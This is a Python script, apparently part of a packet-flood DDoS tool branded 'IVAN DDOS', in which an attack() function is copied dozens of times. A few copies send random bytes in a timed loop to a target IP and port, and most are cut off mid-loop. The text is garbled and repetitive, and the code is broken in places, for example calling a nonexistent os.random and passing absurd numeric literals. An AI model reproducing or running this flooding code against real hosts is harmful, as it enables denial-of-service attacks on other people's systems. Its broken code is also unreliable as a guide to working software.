        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
